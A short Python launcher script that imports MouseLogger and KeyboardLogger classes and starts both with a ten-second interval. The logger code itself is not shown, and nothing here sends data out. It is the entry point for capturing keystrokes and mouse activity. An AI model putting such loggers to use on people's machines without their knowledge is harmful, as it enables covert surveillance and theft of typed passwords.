from MouseLogger import MouseLogger
from KeyboardLogger import KeyboardLogger

TIME_INTERVAL = 10



mouseLogger = MouseLogger(TIME_INTERVAL)
keyLogger =  KeyboardLogger(TIME_INTERVAL)

mouseLogger.start()
keyLogger.start()
